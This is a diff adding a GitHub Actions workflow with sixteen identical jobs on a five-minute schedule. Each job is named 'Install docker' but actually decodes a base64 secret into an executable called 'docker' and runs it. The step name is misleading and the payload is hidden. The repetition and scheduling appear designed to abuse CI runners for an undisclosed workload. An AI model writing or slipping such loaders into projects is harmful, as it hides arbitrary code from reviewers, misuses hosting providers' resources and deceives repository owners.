@@ -1,0 +1,294 @@
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/5 * * * *'
+
+jobs:
+  install:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  test:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  ci:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  stg:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  audit:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  deploy:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  deploy2:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  deploy3:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  deploy4:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  deploy5:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  deploy6:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  deploy7:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  deploy8:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  deploy9:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  deploy10:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
+  deploy11:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
